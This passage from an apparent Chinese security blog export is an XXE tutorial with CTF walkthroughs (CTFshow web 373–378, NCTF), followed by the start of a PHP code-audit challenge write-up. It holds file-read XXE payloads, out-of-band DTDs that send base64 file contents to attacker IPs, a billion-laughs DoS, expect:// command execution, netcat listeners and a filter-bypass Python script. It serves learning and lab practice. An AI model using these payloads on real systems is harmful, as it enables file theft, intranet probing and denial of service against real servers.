根元素[定义内容]>\n示例\n&lt;?xml version=\"1.0\"?> &lt;!--XML声明 -->\n&lt;!DOCTYPE note [ &lt;!--定义了note元素-->\n  &lt;!ELEMENT note (to,from,heading,body)> &lt;!--定义note元素下的四个元素-->\n  &lt;!ELEMENT to      (#PCDATA)> &lt;!--定义了note的子元素to，(#PCDATA)表示元素to是字符串形式-->\n  &lt;!ELEMENT from    (#PCDATA)> &lt;!--定义了note的子元素from，(#PCDATA)表示元素from是字符串形式-->\n  &lt;!ELEMENT heading (#PCDATA)> &lt;!--定义了note的子元素heading，(#PCDATA)表示元素heading是字符串形式-->\n  &lt;!ELEMENT body    (#PCDATA)> &lt;!--定义了note的子元素body，(#PCDATA)表示元素body是字符串形式-->\n]>\n&lt;!-- 至此，上方是DTD文档定义-->\n&lt;note>\n  &lt;to>quan9i&lt;/to>\n  &lt;from>is&lt;/from>\n  &lt;heading>a&lt;/heading>\n  &lt;body>web xiao bai!&lt;/body>\n&lt;/note>\n外部引用格式\n&lt;!DOCTYPE 根元素 SYSTEM \"DTD文件路径\">\n示例：\n&lt;?xml version=\"1.0\"?>\n&lt;!DOCTYPE note SYSTEM \"note.dtd\">\n&lt;note>\n&lt;to>quan9i&lt;/to>\n&lt;from>is&lt;/from>\n&lt;heading>a&lt;/heading>\n&lt;body>web xiao bai!&lt;/body>\n&lt;/note>\nnote.dtd文件的内容如下\n&lt;!DOCTYPE note [\n&lt;!ELEMENT note (to,from,heading,body)>\n&lt;!ELEMENT to      (#PCDATA)>              \n&lt;!ELEMENT from    (#PCDATA)>\n&lt;!ELEMENT heading (#PCDATA)>\n&lt;!ELEMENT body    (#PCDATA)>\n]>\n\n内+外引用格式\n&lt;!DOCTYPE 根元素 SYSTEM \"DTD文件路径\" [定义内容]>\nDTD实体DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。也就是说，在DTD中的实体类型中，一般分为：内部实体和外部实体。实体细分又分为一般实体和参数实体。\n一般实体：\n定义:&lt;!ENTITY 实体名称 \"实体内容\">\n调用:&amp;实体名称;\n\n参数实体:\n定义:&lt;!ENTITY % 实体名 \"实体内容”>\n调用:%实体名称;\n\n内部实体格式\n&lt;!ENTITY 实体名称 \"实体的值\">\n示例\n&lt;?xml version=\"1.0\"?>\n&lt;!DOCTYPE test[\n  &lt;!ENTITY article \"XXE\">\n  &lt;!ENTITY author \"quan9i\">\n]>\n&lt;test>&lt;article>&amp;article;&lt;/article>&lt;author>&amp;author;&lt;/author>&lt;/test>\n外部实体格式\n&lt;!ENTITY 实体名称 SYSTEM \"URI/URL\">\n或者\n&lt;!ENTITY 实体名称 PUBLIC \"public_ID\" \"URI\">\n示例\n&lt;?xml version=\"1.0\"?>\n&lt;!DOCTYPE test[\n  &lt;!ENTITY author SYSTEM \"quan9i.xml\">\n]>\n&lt;test>&amp;author;&lt;/test>\n外部实体同时还支持http等协议，具体如下图这里的话再举个例子\n&lt;?xml version = \"1.0\" encoding = \"utf-8\"?>\n&lt;!DOCTYPE test [\n    &lt;!ENTITY file SYSTEM \"file:///etc/passwd\">\n]>\n&lt;test>&amp;file;&lt;/test>\n同时由于实体又分两种，这里的话再给出一个例子了解一下参数实体示例\n&lt;?xml version=\"1.0\"?>\n&lt;!DOCTYPE test [\n  &lt;!ENTITY % file SYSTEM \"file:///etc/passwd\">\n  %file;\n]>\n此时对于这些知识有了一定的了解，就可以来看一下XXE了\nXXE什么是XXEXXE漏洞全称XML External Entity Injection ，即xml外部实体注入漏洞。\n漏洞成因XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件。\n漏洞危害\n\n\n\n\n\n\n\n\n造成文件读取命令执行内网端口扫描攻击内网网站发起dos攻击等危害\n漏洞成因XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。\nXXE的利用姿势读取任意文件有回显测试代码如下\n&lt;?php\n$xmlfile=file_get_contents('php://input');\n$dom=new DOMDocument();\n$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); \n$xml=simplexml_import_dom($dom);\n$xxe=$xml->xxe;\n$str=\"$xxe \\n\";\necho $str;\n?>\n对代码的解释如下\nfile_get_contents('php://input'):获取客户端输入的内容\nnew DOMDocument():初始化XML解析器\nloadXML($xmlfile):加载客户端输入的XML内容\nsimplexml_import_dom($dom)获取XML文档节点，如果成功则返回SimpleXMLElement对象，如果失败则返回FALSE。\n$xxe=$xml->xxe:获取SimpleXMLElement对象中的节点XXE\necho $str:输出XXE内容。\nPOST上传内容\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?>  //XML声明\n&lt;!DOCTYPE xml [   //定义xml元素\n&lt;!ENTITY quan9i SYSTEM \"file:///c:/windows/system.ini\"> //定义一般实体quan9i\n]> \n&lt;xml>\n&lt;xxe>&amp;quan9i;&lt;/xxe> \n&lt;/xml>\n尝试读取其他文件\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?>  \n&lt;!DOCTYPE test [\n&lt;!ENTITY quan9i SYSTEM \"file:///d:/flag.txt\"> \n]> \n&lt;test>\n&lt;xxe>&amp;quan9i;&lt;/xxe> \n&lt;/test>\n\n无回显源码如下\n&lt;?php\n$xmlfile=file_get_contents('php://input');\n$dom=new DOMDocument();\n$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); \n$xml=simplexml_import_dom($dom);\n$xxe=$xml->xxe;\n$str=\"$xxe \\n\";\n?>\n构造payload如下\n&lt;!DOCTYPE convert [ \n&lt;!ENTITY % remote SYSTEM \"http://192.168.134.128/eval.xml\">\n%remote;%payload;%send;\n]>\n攻击机http://192.168.134.128中eval.xml的内容为\n&lt;!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///d:/flag.txt\">\n&lt;!ENTITY % payload \"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://192.168.134.128/?content=%file;'>\">\n那么这个思路的话就是先调用remote，其实也就是包含这个攻击机上的文件，然后调用payload参数实体，此时就包含了file这个参数实体，然后此时就会去读取文件，那么此时send的内容就是http://192.168.134.128/?content=文件内容，我们此时调用send，就会得到文件内容简单的说，就是\n1、调用remote-->包含eval.xml\n2、调用payload-->包含file参数实体-->读取文件内容(此时send中就是文件内容了)\n3、调用send(将文件内容取出)\nbase64解码一下这个是把读取文件写在攻击机上了，我们也可以写入本地，像这种构造payload\n&lt;!DOCTYPE convert [ \n&lt;!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///d:/flag.txt\">\n&lt;!ENTITY % remote SYSTEM \"http://192.168.134.128/eval.xml\">\n%remote;%payload;%send;\n]>\n攻击机上eval.xml的内容\n&lt;!ENTITY % payload \"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://192.168.134.128/?content=%file;'>\">\n得到flag\nDOS攻击(Denial of service)通过XML外部实体注入，攻击者可以发送任意的HTTP请求，因为解析器会解析文档中的所有实体，所以如果实体声明层层嵌套的话，在一定数量上可以对服务器器造成DoS。常见的XML恶意代码如下\n&lt;?xml version=\"1.0\"?>\n\n&lt;!DOCTYPE lolz [\n\n  &lt;!ENTITY lol \"dos\">\n\n  &lt;!ENTITY lol2 \"&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;\">\n\n  &lt;!ENTITY lol3 \"&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;\">\n\n  &lt;!ENTITY lol4 \"&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;\">\n\n  &lt;!ENTITY lol5 \"&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;\">\n\n  &lt;!ENTITY lol6 \"&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;\">\n\n  &lt;!ENTITY lol7 \"&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;\">\n\n  &lt;!ENTITY lol8 \"&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;\">\n\n  &lt;!ENTITY lol9 \"&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;\">\n\n]>\n\n&lt;lolz>&amp;lol9;&lt;/lolz>\n调用lol9实体参数的时候，会调用10个lol8实体参数，而每个lol8实体参数又包含十个lol7参数，此时就已经调用了10^2个参数实体了，往下会更加的多，这个1K不到的文件经过解析后会耗用大量内存，最终会占用到3G的内存,由此可见这个漏洞是十分危险的一般我们可以这样构造来进行DOS攻击\n&lt;!DOCTYPE data [\n&lt;!ELEMENT data (#ANY)>\n&lt;!ENTITY a0 \"dos\" >\n&lt;!ENTITY a1 \"&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;\">\n&lt;!ENTITY a2 \"&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;\">\n]>\n&lt;data>&amp;a2;&lt;/data>\n\n内网探测当我们获取到一个内网ip地址时，如果有回显，可以在浏览器访问根据访问时间和回显来进行判断存活的端口回显为HTTP request failed!不存活的端口回显位failed to open stream我们也可以利用bp来查看端口是否存活，示例payload如下\n&lt;?xml version=\"1.0\"?>\n&lt;!DOCTYPE test[\n&lt;!ENTITY file SYSTEM \"http://10.244.80.20\">\n]>\n&lt;user>&lt;username>&amp;file;&lt;/username>&lt;password>1&lt;/password>&lt;/user>\n而后利用burpsuite进行爆破，根据回显来判断出端口是否存活说明这个未存活具体操作见下方实战。\n命令执行php的expect扩展可以直接执行系统命令，但遗憾的是这个扩展并不是默认安装的。payload参考\n&lt;!DOCTYPE root[&lt;!ENTITY cmd SYSTEM \"expect://id\">]>\n&lt;dir>\n&lt;file>&amp;cmd;&lt;/file>\n&lt;/dir>\n回显\n&lt;file>uid=501(Apple) gid=20(staff) \ngroups=20(staff),501(access_bpf),12(everyone),61(localaccounts),79(_appserverusr),\n80(admin),81(_appserveradm),98(_lpadmin),401(com.apple.sharepoint.group.1),\n33(_appstore),100(_lpoperator),204(_developer),398(com.apple.access_screensharing),\n399(com.apple.access_ssh)&lt;file>\n\n靶场实战XXE-labgithub地址https://github.com/c0ny1/xxe-lab\n有回显靶场自带的就是有回显的，源代码如下\n&lt;?php\n$USERNAME = 'admin'; //账号\n$PASSWORD = 'admin'; //密码\n$result = null;\n\nlibxml_disable_entity_loader(false);\n$xmlfile = file_get_contents('php://input');\n\ntry&#123;\n  $dom = new DOMDocument();\n  $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);\n  $creds = simplexml_import_dom($dom);\n\n  $username = $creds->username;\n  $password = $creds->password;\n\n  if($username == $USERNAME &amp;&amp; $password == $PASSWORD)&#123;\n    $result = sprintf(\"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>\",1,$username);\n  &#125;else&#123;\n    $result = sprintf(\"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>\",0,$username);\n  &#125; \n&#125;catch(Exception $e)&#123;\n  $result = sprintf(\"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>\",3,$e->getMessage());\n&#125;\n\nheader('Content-Type: text/html; charset=utf-8');\n//echo $result;\n?>\n方法同之前即可，此时我们就找有回显的点，然后将我们想读取的文件作为实体参数的内容，调用实体参数，此时输出结果就可以得到文件内容构造payload如下\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?>  \n&lt;!DOCTYPE xml [ \n&lt;!ENTITY quan9i SYSTEM \"file:///c:/windows/system.ini\">  \n]> \n&lt;user>\n&lt;username>&amp;quan9i;&lt;/username> \n&lt;password>1&lt;/password>\n&lt;/user>\n换个文件再试试\n无回显把靶场的输出信息给注释了就是无回显了随便输入一下然后抓包\n测试一下此时是无回显的，这就对应了Blind XXE的情况，此时可以利用外带和伪协议来获取文件内容，具体方式如下构造payload如下\n&lt;?xml version=\"1.0\"?>\n&lt;!DOCTYPE test[\n&lt;!ENTITY %file SYSTEM \"php://filter/convert.base64-encode/resource=D:/phpStudy/PHPTutorial/WWW/xxe-lab-master/php_xxe/doLogin.php\"\n//参数实体声明中使用到了php的base64编码，这样是为了尽量避免由于文件内容的特殊性，产生xml解析器错误。\n&lt;!ENTITY %dtd SYSTEM \"http://192.168.134.128/eval.xml\">\n%dtd;\n%send;\n]>\n攻击机192.168.134.128中eval.xml的内容\n&lt;!ENTITY % payload \"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://192.168.134.128/?content=%file;'>\">\n//%要进行实体编码&amp;#x25\n %payload;\n攻击方式简述1、%dtd :包含eval.xml–&gt;调用payload实体参数–&gt;调用file实体参数–&gt;查看指定文件此时send实体参数中的内容就是文件内容2、%send，调用send实体参数 ，此时文件内容就会被外带出来\n将内容进行base64解码得到文件内容\nCTFshowweb 373源码\nerror_reporting(0);\nlibxml_disable_entity_loader(false);\n$xmlfile = file_get_contents('php://input');\nif(isset($xmlfile))&#123;\n    $dom = new DOMDocument();\n    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);\n    $creds = simplexml_import_dom($dom);\n    $ctfshow = $creds->ctfshow;\n    echo $ctfshow;\n&#125;\nhighlight_file(__FILE__);   \n不难发现这里的话输出的是这个$ctfshow，因此这里的话我们把引用一个元素放入这个里面就可以了，构造payload如下\n&lt;!DOCTYPE test [\n&lt;!ENTITY xxe SYSTEM \"file:///flag\">\n]>\n&lt;quan9i>\n&lt;ctfshow>&amp;xxe;&lt;/ctfshow>\n&lt;/quan9i>\n\nweb 374error_reporting(0);\nlibxml_disable_entity_loader(false);\n$xmlfile = file_get_contents('php://input');\nif(isset($xmlfile))&#123;\n    $dom = new DOMDocument();\n    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);\n&#125;\nhighlight_file(__FILE__);    \n这里的话发现没回显了，需要用之前服务器外带的那种方法来获取文件内容，具体攻击方式如下payload\n&lt;!DOCTYPE test [\n&lt;!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/flag\">\n&lt;!ENTITY % aaa SYSTEM \"http://124.222.255.142:8083/xxe.dtd\">\n%aaa;\n]>\n&lt;xxe>1&lt;/xxe>\n服务器文件内容\n&lt;!ENTITY % dtd \"&lt;!ENTITY &amp;#x25; xxe  SYSTEM 'http://124.222.255.142:7777/?content=%file;'> \">\n%dtd;\n%xxe;\n文件内容base64解码即可得到flag原理也很简单，与之前类似\n1、调用aaa参数实体-->包含dtd文件-->xml.dtd文件中包含了file参数实体-->file参数实体被调用，成功读取文件-->xml.dtd文件调用dtd参数实体，此时就包含了后面那些内容-->xml.dtd文件调用xxe参数实体，xxe参数实体中含有file参数实体，也就是文件内容，此时就会将内容给带出来\n2、监听7777端口，获取这个内容，就相当于我们访问了文件，此时就可以达到我们外带的目的了\nweb 375&lt;?php\nerror_reporting(0);\nlibxml_disable_entity_loader(false);\n$xmlfile = file_get_contents('php://input');\nif(preg_match('/&lt;\\?xml version=\"1\\.0\"/', $xmlfile))&#123;\n    die('error');\n&#125;\nif(isset($xmlfile))&#123;\n    $dom = new DOMDocument();\n    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);\n&#125;\nhighlight_file(__FILE__);    \n增添了过滤，过滤了内容&lt;?xml version=&quot;1.0&quot;，我们这里同上关payload即可，不过我们这里的话我们在payload中进行调用，不在在文件中进行调用，payload如下\n&lt;!DOCTYPE test [\n&lt;!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/flag\">\n&lt;!ENTITY % xxe SYSTEM \"http://124.222.255.142:8083/xxe.dtd\">\n%xxe;\n%dtd;\n%send;\n]>\n&lt;xxe>1&lt;/xxe>\n文件内容为\n&lt;!ENTITY % dtd \"&lt;!ENTITY &amp;#x25; send  SYSTEM 'http://124.222.255.142:7777/?content=%file;'> \">\n先监听，后发包\nnc -lvnp 7777\n\nbase64解码可得flag\nweb 376&lt;?php\nerror_reporting(0);\nlibxml_disable_entity_loader(false);\n$xmlfile = file_get_contents('php://input');\nif(preg_match('/&lt;\\?xml version=\"1\\.0\"/i', $xmlfile))&#123;\n    die('error');\n&#125;\nif(isset($xmlfile))&#123;\n    $dom = new DOMDocument();\n    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);\n&#125;\nhighlight_file(__FILE__);    \n相比上关增添了大小写过滤，我们同之前思路即可\nweb 377&lt;?php\nerror_reporting(0);\nlibxml_disable_entity_loader(false);\n$xmlfile = file_get_contents('php://input');\nif(preg_match('/&lt;\\?xml version=\"1\\.0\"|http/i', $xmlfile))&#123;\n    die('error');\n&#125;\nif(isset($xmlfile))&#123;\n    $dom = new DOMDocument();\n    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);\n&#125;\nhighlight_file(__FILE__);    \n过滤了http，这个时候我们设定一个特殊的编码方式（例:UTF-16），这样转换一下就可以实现绕过，这里的不话不用bp，用python脚本来攻击，脚本如下\nimport requests\n\nurl = 'http://95b7794d-1b60-4bfb-926c-e1bfbb955c8f.challenge.ctf.show/'\ndata = \"\"\"&lt;!DOCTYPE ANY [\n&lt;!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/flag\">\n&lt;!ENTITY % xxe SYSTEM \"http://124.222.255.142:8083/xxe.dtd\">\n%xxe;\n%dtd;\n%send;\n] >\n&lt;xxe>1&lt;/xxe>\n\"\"\"\nrequests.post(url ,data=data.encode('utf-16'))\nprint(\"done!\")\n先监听，后运行脚本\nweb 378界面类似xxe-lab，抓包看一下\n一眼顶真，鉴定完毕，是有回显的XXE,使用file伪协议直接读取就可以\n&lt;!DOCTYPE test[\n&lt;!ENTITY  file SYSTEM \"file:///flag\">\n]>\n&lt;user>&lt;username>&amp;file;&lt;/username>&lt;password>1&lt;/password>&lt;/user>\n\n内网探测([NCTF2019]True XML cookbook)界面有两个输入框，随便输入后抓包尝试读取文件\n&lt;!DOCTYPE xml[\n&lt;!ENTITY quan9i SYSTEM \"file:///flag\">\n]>\n&lt;user>&lt;username>&amp;quan9i;&lt;/username>&lt;password>1&lt;/password>&lt;/user>\n\n发现没有flag文件，那探测探测其他的文件\n&lt;!DOCTYPE xml[\n&lt;!ENTITY quan9i SYSTEM \"file:///etc/passwd\">\n]>\n&lt;user>&lt;username>&amp;quan9i;&lt;/username>&lt;password>1&lt;/password>&lt;/user>\n\n\n&lt;!DOCTYPE xml[\n&lt;!ENTITY quan9i SYSTEM \"file:///etc/hosts\">\n]>\n&lt;user>&lt;username>&amp;quan9i;&lt;/username>&lt;password>1&lt;/password>&lt;/user>\n\n\n&lt;!DOCTYPE xml[\n&lt;!ENTITY quan9i SYSTEM \"file:///proc/net/arp\">\n]>\n&lt;user>&lt;username>&amp;quan9i;&lt;/username>&lt;password>1&lt;/password>&lt;/user>\n得到一个ip，进行内网探测此时未爆破出来，说明可能不是这个，我们换file:///proc/net/fib_trie命令继续寻找ip继续内网探测设置变量设置次数调大线程\n得到flag\n参考文献https://xz.aliyun.com/t/6754https://xz.aliyun.com/t/3357https://xz.aliyun.com/t/6887https://tttang.com/archive/1110/#toc_phpexpectrce\n","slug":"浅析XML实体注入","date":"2022-09-02T02:11:20.000Z","categories_index":"WEB知识","tags_index":"XML","author_index":"quan9i"},{"id":"2701665bc33e3ae6e528c88e69e6e2f6","title":"PHP代码审计之旅之百家CMS","content":"前言代码审计不会，学习知识需要积累一下基础，因此来搭建php_bugs进行相关学习，题解如下，希望能对在学习代码审计的师傅们有所帮助\n靶场github链接如下https://github.com/bowu678/php_bugs\nextract变量覆盖&lt;?php\n$flag='xxx'; \nextract($_GET);\n if(isset($shiyan))\n &#123; \n    $content=trim(file_get_contents($flag));\n    if($shiyan==$content)\n    &#123; \n        echo'ctf&#123;xxx&#125;'; \n    &#125;\n   else\n   &#123; \n    echo'Oh.no';\n   &#125; \n   &#125;\n?>\n这里的话发现是$shiyan==$content，才会输出flag，但是flag内容是不可控的，这里的话就需要说一下这个extract()函数了\nextract — 从数组中将变量导入到当前的符号表\n其实这个概念，自我感觉说的比较笼统，不过这里我们可以举个栗子来进行学习\n&lt;?php\nshow_source(__FILE__);\n$a=2;\nextract($_GET);\necho $a;\n?>\n当出现与他同名的变量时，后者会覆盖前者\n此时来看本关代码\n$flag='xxx'; \nextract($_GET);\n if(isset($shiyan))\n &#123; \n    $content=trim(file_get_contents($flag));\n    if($shiyan==$content)\n这里需要实现$shiyan==$content，$content来源于file_get_contents($flag)，而这个file_get_contents函数是把文件的信息打印出来，我们这个flag是个变量，他取值必定不是文件名，因此这里content变量的值为空，此时无论怎么写flag，content都为空，我们只需要保证shiyan也为空就可以，构造payload如下\nflag=123&amp;shiyan=\n\n绕过过滤的空白字符&lt;?php\n show_source(__FILE__);\n$info = \"\"; \n$req = [];\n$flag=\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\";\n \nini_set(\"display_error\", false); //为一个配置选项设置值\nerror_reporting(0); //关闭所有PHP错误报告\n \nif(!isset($_GET['number']))&#123;\n   header(\"hint:26966dc52e85af40f59b4fe73d8c323a.txt\"); //HTTP头显示hint 26966dc52e85af40f59b4fe73d8c323a.txt\n \n   die(\"have a fun!!\"); //die — 等同于 exit()\n \n&#125;\n \nforeach([$_GET, $_POST] as $global_var) &#123;  //foreach 语法结构提供了遍历数组的简单方式 \n    foreach($global_var as $key => $value) &#123; \n        $value = trim($value);  //trim — 去除字符串首尾处的空白字符（或者其他字符）\n        is_string($value) &amp;&amp; $req[$key] = addslashes($value); // is_string — 检测变量是否是字符串，addslashes — 使用反斜线引用字符串\n    &#125; \n&#125; \n \n \nfunction is_palindrome_number($number) &#123; \n    $number = strval($number); //strval — 获取变量的字符串值\n    $i = 0; \n    $j = strlen($number) - 1; //strlen — 获取字符串长度\n    while($i &lt; $j) &#123; \n        if($number[$i] !== $number[$j]) &#123; \n            return false; \n        &#125; \n        $i++; \n        $j--; \n    &#125; \n    return true; \n&#125; \n \n \nif(is_numeric($_REQUEST['number'])) //is_numeric — 检测变量是否为数字或数字字符串 \n&#123;\n \n   $info=\"sorry, you cann't input a number!\";\n \n&#125;\nelseif($req['number']!=strval(intval($req['number']))) //intval — 获取变量的整数值\n&#123;\n \n     $info = \"number must be equal to it's integer!! \";  \n \n&#125;\nelse\n&#123;\n \n     $value1 = intval($req[\"number\"]);\n     $value2 = intval(strrev($req[\"number\"]));  \n \n     if($value1!=$value2)&#123;\n          $info=\"no, this is not a palindrome number!\";\n     &#125;\n     else\n     &#123;\n \n          if(is_palindrome_number($req[\"number\"]))&#123;\n              $info = \"nice! &#123;$value1&#125; is a palindrome number!\"; \n          &#125;\n          else\n          &#123;\n             $info=$flag;\n          &#125;\n     &#125;\n \n&#125;\n \necho $info;\n这里的话大看一下有四个要求\n1、if(is_numeric($_REQUEST['number'])) 这个条件需要为假，才能继续往下运行\n2、要求$req['number']==strval(intval($req['number']))\n3、要求intval($req[\"number\"])==intval(strrev($req[\"number\"]));//strrev函数作用是反转字符串\n4、 if(is_palindrome_number($req[\"number\"]))这个条件需要为假，才能输出flag\n针对第一个条件的话，赋值的时候加上一个%00就可以绕过针对$req[&#39;number&#39;]==strval(intval($req[&#39;number&#39;]))的话，它这个相当于是不让变量中有字符串，只能有数字时才符合条件，这个是怎么知道的呢，当然是本地测试\n&lt;?php\nshow_source(__FILE__);\n$a=addslashes(trim($_GET['a']));\n$b=strval(intval($a));\nvar_dump($a==$b);\n?>\n一般的话肯定考虑一个空格给它绕过，但是这段代码里传入的变量都经过了trim函数，trim函数过滤了很多空白字符一般的话当然是没办法了，但是这里还有一个%0c，也就是\\f未被过滤，因此这里我们可以用它来进行绕过，我们本地试也可以发现它是符合条件的现在来看第三个条件intval($req[&quot;number&quot;])==intval(strrev($req[&quot;number&quot;]));，这个strrev函数的作用是反转字符串，这里的话也就是要求数字是回文数，比如131，这个时候反转一下还是131，此时就可以满足条件了来看最后一个，让 if(is_palindrome_number($req[&quot;number&quot;]))条件为假，这个函数定义如下\nfunction is_palindrome_number($number) &#123; \n    $number = strval($number); //strval — 获取变量的字符串值\n    $i = 0; \n    $j = strlen($number) - 1; //strlen — 获取字符串长度\n    while($i &lt; $j) &#123; \n        if($number[$i] !== $number[$j]) &#123; \n            return false; \n        &#125; \n        $i++; \n        $j--; \n    &#125; \n    return true; \n&#125; \n这个函数当它是回文数时就会正确，因此看似是与条件三矛盾的，但想到还有空白字符，用它的时候同时写回文数，此时是不是就可以成功绕过呢此时的话第四个也就可以满足，结合前三个，需要%00，需要%0c，需要回文数，因此这个第四个测试的payload其实就是符合条件的同时呢，这里再补充一下，%0c也可以用%2B，也就是+来代替，以为111与+111两者并无二致\n多重加密&lt;?php\nshow_source(__FILE__);\n    include 'common.php';\n    $requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE);\n    //把一个或多个数组合并为一个数组\n    class db\n    &#123;\n        public $where;\n        function __wakeup()\n        &#123;\n            if(!empty($this->where))\n            &#123;\n                $this->select($this->where);\n            &#125;\n        &#125;\n        function select($where)\n        &#123;\n            $sql = mysql_query('select * from user where '.$where);\n            //函数执行一条 MySQL 查询。\n            return @mysql_fetch_array($sql);\n            //从结果集中取得一行作为关联数组，或数字数组，或二者兼有返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false\n        &#125;\n    &#125;\n\n    if(isset($requset['token']))\n    //测试变量是否已经配置。若变量已存在则返回 true 值。其它情形返回 false 值。\n    &#123;\n        $login = unserialize(gzuncompress(base64_decode($requset['token'])));\n        //gzuncompress:进行字符串压缩\n        //unserialize: 将已序列化的字符串还原回 PHP 的值\n\n        $db = new db();\n        $row = $db->select('user=\\''.mysql_real_escape_string($login['user']).'\\'');\n        //mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。\n\n        if($login['user'] === 'ichunqiu')\n        &#123;\n            echo $flag;\n        &#125;else if($row['pass'] !== $login['pass'])&#123;\n            echo 'unserialize injection!!';\n        &#125;else&#123;\n            echo \"(╯‵□′)╯︵┴─┴ \";\n        &#125;\n    &#125;else&#123;\n        header('Location: index.php?error=1');\n    &#125;\n\n?> \n重点的话有以下几处，分别是输出flag的地方\nif($login['user'] === 'ichunqiu')\n      &#123;\n          echo $flag;\n这就要求$login[&#39;user&#39;]为ichunqiu，其次就是它的加密\nif(isset($requset['token']))\n//测试变量是否已经配置。若变量已存在则返回 true 值。其它情形返回 false 值。\n&#123;\n    $login = unserialize(gzuncompress(base64_decode($requset['token'])));\n    //gzuncompress:进行字符串压缩\n    //unserialize: 将已序列化的字符串还原回 PHP 的值\n这里的话我们需要user为一个固定的值，但是它加密了，那该怎么办呢，我们反向加密即可，构造脚本如下\n&lt;?php\n$a=array(['user']==='ichunqiu');\n$user =base64_encode(gzcompress(serialize($a)));\necho $user;\n?>\n得到值后在session中修改user的值即可\nSQL注入_with rollup绕过&lt;?php\nerror_reporting(0);\nshow_source(__FILE__);\nif (!isset($_POST['uname']) || !isset($_POST['pwd'])) &#123;\n    echo '&lt;form action=\"\" method=\"post\">'.\"&lt;br/>\";\n    echo '&lt;input name=\"uname\" type=\"text\"/>'.\"&lt;br/>\";\n    echo '&lt;input name=\"pwd\" type=\"text\"/>'.\"&lt;br/>\";\n    echo '&lt;input type=\"submit\" />'.\"&lt;br/>\";\n    echo '&lt;/form>'.\"&lt;br/>\";\n    echo '&lt;!--source: source.txt-->'.\"&lt;br/>\";\n    die;\n&#125;\n\nfunction AttackFilter($StrKey,$StrValue,$ArrReq)&#123;  \n    if (is_array($StrValue))&#123;\n\n//检测变量是否是数组\n\n        $StrValue=implode($StrValue);\n\n//返回由数组元素组合成的字符串\n\n    &#125;\n    if (preg_match(\"/\".$ArrReq.\"/is\",$StrValue)==1)&#123;   \n\n//匹配成功一次后就会停止匹配\n\n        print \"水可载舟，亦可赛艇！\";\n        exit();\n    &#125;\n&#125;\n\n$filter = \"and|select|from|where|union|join|sleep|benchmark|,|\\(|\\)\";\nforeach($_POST as $key=>$value)&#123; \n\n//遍历数组\n\n    AttackFilter($key,$value,$filter);\n&#125;\n\n$con = mysql_connect(\"XXXXXX\",\"XXXXXX\",\"XXXXXX\");\nif (!$con)&#123;\n    die('Could not connect: ' . mysql_error());\n&#125;\n$db=\"XXXXXX\";\nmysql_select_db($db, $con);\n\n//设置活动的 MySQL 数据库\n\n$sql=\"SELECT * FROM interest WHERE uname = '&#123;$_POST['uname']&#125;'\";\n$query = mysql_query($sql); \n\n//执行一条 MySQL 查询\n\nif (mysql_num_rows($query) == 1) &#123; \n\n//返回结果集中行的数目\n\n    $key = mysql_fetch_array($query);\n\n//返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false\n\n    if($key['pwd'] == $_POST['pwd']) &#123;\n        print \"CTF&#123;XXXXXX&#125;\";\n    &#125;else&#123;\n        print \"亦可赛艇！\";\n    &#125;\n&#125;else&#123;\n    print \"一颗赛艇！\";\n&#125;\nmysql_close($con);\n?>\n重点在于过滤处\n$filter = \"and|select|from|where|union|join|sleep|benchmark|,|\\(|\\)\";\nforeach($_POST as 